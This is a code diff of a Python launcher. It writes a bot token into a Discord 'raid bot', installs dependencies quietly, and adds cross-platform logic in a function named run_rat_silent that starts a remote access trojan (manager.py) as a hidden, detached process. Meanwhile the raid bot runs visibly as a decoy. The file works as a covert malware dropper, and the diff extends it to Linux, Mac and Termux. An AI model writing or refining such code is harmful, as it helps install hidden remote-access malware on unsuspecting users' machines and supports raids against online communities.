@@ -24,7 +24,7 @@ def get_bot_token():
 
 def write_raid_bot_token(token):
     """WRITE TOKEN TO RAID BOT CONFIG"""
-    raid_bot_path = Path("raid-bot/bot.py")
+    raid_bot_path = Path("raid-bot.py")  # FIXED - file is in root, not in folder
     
     with open(raid_bot_path, 'r', encoding='utf-8') as f:
         content = f.read()
@@ -40,46 +40,52 @@ def install_dependencies():
     """INSTALL ALL REQUIREMENTS"""
     print("\n📦 Installing dependencies...")
     
-    CREATE_NO_WINDOW = 0x08000000
-    
-    subprocess.run(
-        [sys.executable, "-m", "pip", "install", "-q", "-r", "requirements.txt"],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL,
-        creationflags=CREATE_NO_WINDOW if sys.platform == "win32" else 0
-    )
-    
-    print("✅ Dependencies installed")
-
-def run_rat_silent():
-    """RUN RAT IN BACKGROUND SILENTLY (WINDOWS 11)"""
-    rat_path = Path("system-manager/manager.py")
-    
-    CREATE_NO_WINDOW = 0x08000000
-    DETACHED_PROCESS = 0x00000008
-    
-    # WINDOWS 11 - USE pythonw.exe (NO WINDOW)
-    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-    
-    if os.path.exists(pythonw):
-        subprocess.Popen(
-            [pythonw, str(rat_path)],
-            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
+    try:
+        subprocess.run(
+            [sys.executable, "-m", "pip", "install", "-q", "-r", "requirements.txt"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
+        print("✅ Dependencies installed")
+    except:
+        print("⚠️ Dependency installation skipped")
+
+def run_rat_silent():
+    """RUN RAT IN BACKGROUND SILENTLY"""
+    rat_path = Path("manager.py")  # FIXED - file is in root
+    
+    if sys.platform == "win32":
+        # WINDOWS - SILENT MODE
+        CREATE_NO_WINDOW = 0x08000000
+        DETACHED_PROCESS = 0x00000008
+        
+        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+        
+        if os.path.exists(pythonw):
+            subprocess.Popen(
+                [pythonw, str(rat_path)],
+                creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        else:
+            subprocess.Popen(
+                [sys.executable, str(rat_path)],
+                creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
     else:
-        # FALLBACK
+        # LINUX/MAC/TERMUX - BACKGROUND PROCESS
         subprocess.Popen(
             [sys.executable, str(rat_path)],
-            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
 
 def run_raid_bot():
     """RUN RAID BOT (VISIBLE TO USER)"""
-    raid_bot_path = Path("raid-bot/bot.py")
+    raid_bot_path = Path("raid-bot.py")  # FIXED - file is in root
     subprocess.run([sys.executable, str(raid_bot_path)])
 
 def main():
